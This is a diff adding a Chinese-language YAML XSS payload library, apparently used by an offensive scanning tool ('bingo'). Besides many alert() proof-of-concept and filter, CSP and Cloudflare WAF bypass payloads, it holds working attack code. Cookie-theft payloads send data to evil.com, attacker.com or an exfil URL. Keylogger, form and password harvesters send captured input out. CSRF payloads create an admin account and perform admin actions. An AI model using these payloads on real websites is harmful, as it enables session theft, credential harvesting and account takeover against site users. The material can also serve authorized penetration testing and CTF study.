@@ -1,0 +1,261 @@
+# XSS Payload 知识库
+# 来源: Des-CTF-Knowledge + Hunter 实战经验
+# 更新: 2026-06-02
+
+metadata:
+  category: xss
+  description: "XSS (跨站脚本) Payload 集合"
+  version: "1.0"
+
+# ============================================
+# 1. 基础 Payload
+# ============================================
+basic:
+  description: "基础 XSS Payload"
+  alert:
+    - "<script>alert(1)</script>"
+    - "<script>alert('XSS')</script>"
+    - "<script>alert(document.domain)</script>"
+    - "<script>alert(document.cookie)</script>"
+  img:
+    - "<img src=x onerror=alert(1)>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<img src=x onerror=alert(document.domain)>"
+    - "<img src=1 onerror=alert(1)>"
+  svg:
+    - "<svg onload=alert(1)>"
+    - "<svg/onload=alert(1)>"
+    - "<svg onload=alert('XSS')>"
+    - "<svg><script>alert(1)</script></svg>"
+  body:
+    - "<body onload=alert(1)>"
+    - "<body onpageshow=alert(1)>"
+  input:
+    - "<input onfocus=alert(1) autofocus>"
+    - "<input onblur=alert(1) autofocus><input autofocus>"
+  details:
+    - "<details open ontoggle=alert(1)>"
+    - "<details open ontoggle=alert('XSS')>"
+  marquee:
+    - "<marquee onstart=alert(1)>"
+  video:
+    - "<video><source onerror=alert(1)>"
+  audio:
+    - "<audio src=x onerror=alert(1)>"
+  a:
+    - "<a href=javascript:alert(1)>click</a>"
+    - "<a href='javascript:alert(1)'>click</a>"
+
+# ============================================
+# 2. 事件处理器
+# ============================================
+events:
+  description: "事件处理器 XSS"
+  mouse:
+    - "<div onmouseover=alert(1)>hover</div>"
+    - "<div onmouseenter=alert(1)>hover</div>"
+    - "<div onmouseleave=alert(1)>hover</div>"
+  keyboard:
+    - "<div onkeydown=alert(1) autofocus tabindex=1>test</div>"
+    - "<div onkeyup=alert(1) autofocus tabindex=1>test</div>"
+  focus:
+    - "<div onfocus=alert(1) autofocus tabindex=1>test</div>"
+    - "<div onblur=alert(1) autofocus tabindex=1>test</div>"
+  form:
+    - "<form onsubmit=alert(1)><input type=submit></form>"
+    - "<form action=javascript:alert(1)><input type=submit></form>"
+  scroll:
+    - "<div onscroll=alert(1) style=overflow:scroll;height:100px>test</div>"
+
+# ============================================
+# 3. 编码绕过
+# ============================================
+encoding_bypass:
+  description: "编码绕过技巧"
+  html_entity:
+    - "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+    - "&#60;script&#62;alert(1)&#60;/script&#62;"
+  unicode:
+    - "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"
+    - "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"
+  hex:
+    - "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"
+  base64:
+    - "<script>eval(atob('YWxlcnQoMSk='))</script>"
+  url_encode:
+    - "%3Cscript%3Ealert(1)%3C/script%3E"
+  double_url_encode:
+    - "%253Cscript%253Ealert(1)%253C/script%253E"
+  mixed_case:
+    - "<ScRiPt>alert(1)</ScRiPt>"
+    - "<SCRIPT>alert(1)</SCRIPT>"
+
+# ============================================
+# 4. 过滤绕过
+# ============================================
+filter_bypass:
+  description: "常见过滤绕过"
+  no_space:
+    - "<img/src=x/onerror=alert(1)>"
+    - "<svg/onload=alert(1)>"
+  no_quotes:
+    - "<img src=x onerror=alert(1)>"
+    - "<svg onload=alert(String.fromCharCode(88,83,83))>"
+  no_parentheses:
+    - "<script>alert`1`</script>"
+    - "<script>onerror=alert;throw 1</script>"
+  no_script:
+    - "<img src=x onerror=alert(1)>"
+    - "<svg onload=alert(1)>"
+    - "<body onload=alert(1)>"
+  no_alert:
+    - "<script>console.log(1)</script>"
+    - "<script>document.write(1)</script>"
+    - "<script>confirm(1)</script>"
+    - "<script>prompt(1)</script>"
+  svg_animation:
+    - "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+  template_literal:
+    - "<script>alert`1`</script>"
+  throw_onerror:
+    - "<script>onerror=alert;throw 1</script>"
+  dom_clobbering:
+    - "<form id=test><input name=action><input name=url value=javascript:alert(1)></form>"
+
+# ============================================
+# 5. DOM XSS
+# ============================================
+dom_xss:
+  description: "DOM 型 XSS"
+  location_hash:
+    - "javascript:alert(1)"
+    - "#<script>alert(1)</script>"
+  document_write:
+    - "<img src=x onerror=alert(1)>"
+  innerHTML:
+    - "<img src=x onerror=alert(1)>"
+  eval:
+    - "alert(1)"
+    - "document.cookie"
+  setTimeout:
+    - "alert(1)"
+  setInterval:
+    - "alert(1)"
+
+# ============================================
+# 6. 特定场景 Payload
+# ============================================
+context_specific:
+  description: "特定上下文的 XSS"
+  html_attribute:
+    - "\" onmouseover=alert(1) \""
+    - "' onmouseover=alert(1) '"
+    - "\" onfocus=alert(1) autofocus \""
+  javascript_string:
+    - "\";alert(1);//"
+    - "';alert(1);//"
+    - "\\\";alert(1);//"
+  url:
+    - "javascript:alert(1)"
+    - "javascript:alert(document.cookie)"
+    - "data:text/html,<script>alert(1)</script>"
+  css:
+    - "expression(alert(1))"
+    - "background:url(javascript:alert(1))"
+
+# ============================================
+# 7. 高级 Payload
+# ============================================
+advanced:
+  description: "高级 XSS Payload"
+  csp_bypass:
+    - "<link rel=import href=http://evil.com/xss.html>"
+    - "<script src=http://evil.com/xss.js></script>"
+  websocket:
+    - "<script>var ws=new WebSocket('ws://evil.com');ws.onmessage=function(e){eval(e.data)}</script>"
+  fetch_exfil:
+    - "<script>fetch('http://evil.com?c='+document.cookie)</script>"
+    - "<script>new Image().src='http://evil.com?c='+document.cookie</script>"
+  service_worker:
+    - "<script>navigator.serviceWorker.register('http://evil.com/sw.js')</script>"
+  clipboard:
+    - "<script>navigator.clipboard.readText().then(t=>fetch('http://evil.com?c='+t))</script>"
+
+# ============================================
+# 8. bingo v7.0.66 import (2026-08-02)
+# ============================================
+bingo_advanced_22:
+  description: "22种高级XSS payload (bingo xss_advanced_test)"
+  payloads:
+    - "<ScRiPt>alert(1)</ScRiPt>"
+    - "<script>alert`1`</script>"
+    - "jaVasCript:alert(1)"
+    - "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+    - "<img src=x onerror=alert(1)>"
+    - "<svg/onload=alert(1)>"
+    - "<details open ontoggle=alert(1)>"
+    - "<body onpageshow=alert(1)>"
+    - "<input autofocus onfocus=alert(1)>"
+    - "<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>"
+    - "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
+    - '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'
+    - "<table><td><s>X</td></table><img src=x onerror=alert(1)>"
+    - "{{constructor.constructor('alert(1)')()}}"
+    - "{{_c.constructor('alert(1)')()}}"
+    - "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>"
+    - "<link rel=prefetch href=//attacker.com/steal?c=+document.cookie>"
+    - "<script type=importmap>{\"imports\":{\"x\":\"data:text/javascript,alert(1)\"}}</script>"
+    - "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+    - "<svg><set attributeName=onmouseover value=alert(1)>"
+    - "<form action=javascript:alert(1)><input type=submit>"
+    - "<x accesskey=x onclick=alert(1)>X</x>"
+bingo_cookie_steal:
+  description: "Cookie窃取payload族 (E=exfil_url)"
+  img_onerror:
+    - "<img src=x onerror=\"fetch('E?c='+document.cookie)\">"
+    - "<img src=x onerror=\"new Image().src='E?c='+btoa(document.cookie)\">"
+    - "<img src=x onerror=this.src='E?x='+document.cookie>"
+  svg_onload:
+    - "<svg onload=\"fetch('E?c='+encodeURIComponent(document.cookie))\">"
+    - "<svg/onload=fetch('E?'+btoa(document.cookie))>"
+  script:
+    - "<script>fetch(\"E?c=\"+document.cookie)</script>"
+    - "<script>var i=new Image();i.src=\"E?x=\"+btoa(document.cookie)</script>"
+    - "<script>document.location=\"E?c=\"+document.cookie</script>"
+  iframe_srcdoc:
+    - "<iframe srcdoc=\"&lt;script&gt;fetch(&quot;E?c=&quot;+document.cookie)&lt;/script&gt;\"></iframe>"
+  attr_context:
+    - "\" onmouseover=\"fetch('E?c='+document.cookie)\" x=\""
+    - "\" onfocus=\"fetch('E?c='+document.cookie)\" autofocus x=\""
+    - "' onmouseover='fetch(\"E?c=\"+document.cookie)' x='"
+  js_context:
+    - "';fetch('E?c='+document.cookie)//"
+    - "\";fetch(\"E?c=\"+document.cookie)//"
+    - "`};fetch('E?c='+document.cookie)//"
+bingo_csp_bypass:
+  jsonp:
+    - "<script src={jsonp_url}?callback=fetch('E?c='+document.cookie)//></script>"
+  angular_sandbox:
+    - "<script src=https://{trusted}/angular.min.js></script><div ng-app ng-csp>{{$eval.constructor('fetch(\"E?c=\"+document.cookie)')()}}</div>"
+bingo_cf_2026:
+  description: "Cloudflare WAF XSS绕过 2026 (Bug Bytes #235)"
+  payloads:
+    - "<div oncontentvisibilityautostatechange=alert(document.domain) style=content-visibility:auto>"
+    - "<div onanimationstart=alert(1) style=animation-name:x>"
+    - "<div ontransitionend=alert(1) style=transition:all .1s>"
+    - "<img src=x ondragstart=alert(1)>"
+    - "<div onpointerdown=alert(1)>click"
+    - "<a href=x onauxclick=alert(1)>middle-click me</a>"
+    - "<!--><img src=x onerror=alert(1)>"
+bingo_keylogger:
+  keypress: "var _kl='';document.addEventListener('keypress',function(e){_kl+=String.fromCharCode(e.which||e.keyCode);if(_kl.length%20==0)fetch('E?k='+btoa(_kl));});"
+  submit_harvest: "document.addEventListener('submit',function(){var d=new FormData(this);var s='';d.forEach(function(v,k){s+=k+'='+v+'&'});fetch('E?form='+btoa(s));},true);"
+  password_harvester: "setInterval(function(){document.querySelectorAll('input[type=password]').forEach(function(el){if(el.value)fetch('E?p='+btoa(el.name+'='+el.value))})},2000);"
+bingo_stored_xss_csrf:
+  add_admin: "fetch('{csrf_target}',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include',body:'username=hacker&password=hacked123&role=admin'}).then(r=>r.text()).then(t=>fetch('E?r='+btoa(t)))"
+  csrf_token_read_then_post: "fetch('{page}',{credentials:'include'}).then(r=>r.text()).then(h=>{var p=new DOMParser();var d=p.parseFromString(h,'text/html');var t=d.querySelector('input[name=csrf_token]');if(t)fetch('{post_url}',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include',body:'csrf_token='+t.value+'&admin_action=add_user'})})"
+bingo_context_detection:
+  marker: "BINGO_XSS_MARKER_7x9z"
+  attr: '"{marker}" in body or '\''{marker}'\'' in body'
+  html: ">{marker}< in body"
+  js: "var x = \"{marker} 出现在JS变量赋值"
